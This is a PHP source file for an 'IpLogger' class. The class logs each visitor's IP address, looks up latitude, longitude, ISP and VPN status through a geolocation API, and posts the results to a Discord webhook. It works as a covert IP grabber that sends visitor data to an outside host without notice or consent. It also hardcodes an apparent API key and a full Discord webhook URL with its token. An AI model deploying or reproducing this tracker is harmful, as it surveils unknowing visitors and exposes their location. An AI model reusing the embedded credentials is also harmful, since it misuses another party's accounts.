<?php

class IpLogger {
    private $apiKey = 'c3ff1ab93dd84d8f991646bd33e2bbf8'; // API key
    private $webhookUrl = 'https://discord.com/api/webhooks/1268297909875773571/u781Y8fkPHJi5Vdl5DEU8KbHpUiE8jJ64nUYTIv8Ep6CPFPZsysCizlNsOHNYsKzIbQv'; // Webhook URL
    private $timezone;

    public function __construct($timezone = 'UTC') {
        $this->timezone = $timezone;
    }

    public function write($filename) {
        $ip = $_SERVER['REMOTE_ADDR'];
        $timestamp = (new DateTime('now', new DateTimeZone($this->timezone)))->format('Y-m-d H:i:s');
        $logEntry = "$timestamp - IP: $ip\n";

        // Write the log entry to the file
        file_put_contents($filename, $logEntry, FILE_APPEND | LOCK_EX);

        // Get IP geolocation data
        $geoData = $this->getIpGeoData($ip);

        // Send the IP and location data to Discord
        $response = $this->sendIpToDiscord($ip, $geoData);

        if ($response === false) {
            error_log("Failed to send IP to Discord");
        }
    }

    private function getIpGeoData($ip) {
        $url = "https://api.ipgeolocation.io/ipgeo?apiKey={$this->apiKey}&ip=$ip";

        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        curl_close($curl);

        if ($response === false) {
            error_log("Failed to retrieve geolocation data for IP: $ip");
            return null;
        }

        $data = json_decode($response, true);

        return [
            'latitude' => $data['latitude'] ?? 'Unknown',
            'longitude' => $data['longitude'] ?? 'Unknown',
            'is_vpn' => $data['is_vpn'] ?? 'Unknown',
            'isp' => $data['isp'] ?? 'Unknown'
        ];
    }

    private function sendIpToDiscord($ip, $geoData) {
        $fields = [
            ["name" => "IP", "value" => $ip, "inline" => true]
        ];

        if ($geoData) {
            $vpnStatus = ($geoData['is_vpn'] === 'true') ? 'Yes' : 'No';
            $fields[] = ["name" => "VPN", "value" => $vpnStatus, "inline" => true];
            $fields[] = ["name" => "Coordinates", "value" => "Lat: {$geoData['latitude']}, Lon: {$geoData['longitude']}", "inline" => true];
            $fields[] = ["name" => "ISP", "value" => $geoData['isp'], "inline" => false];
        }

        $infoArr = [
            "username" => "KendrickBot",
            "embeds" => [
                [
                    "title" => "User Information",
                    "color" => 39423,
                    "fields" => $fields,
                ]
            ],
        ];

        $json = json_encode($infoArr);

        $curl = curl_init($this->webhookUrl);
        curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $json);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($curl);
        if (curl_errno($curl)) {
            error_log('cURL error: ' . curl_error($curl));
            curl_close($curl);
            return false;
        }

        curl_close($curl);
        return $response;
    }
}

?>
